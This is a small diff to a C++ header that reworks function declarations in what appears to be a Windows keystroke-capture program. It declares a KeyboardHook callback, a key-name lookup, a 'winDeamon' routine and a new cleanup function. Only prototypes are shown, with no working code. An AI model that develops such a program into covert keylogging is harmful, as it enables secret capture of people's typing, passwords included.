@@ -4,7 +4,8 @@
 #include <string>
 
 void startup();
-void winDeamon(HHOOK* kbd);
+void winDeamon();
+void cleanup();
 LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam);
 std::string GetKeyName(unsigned int virtualKey);
 
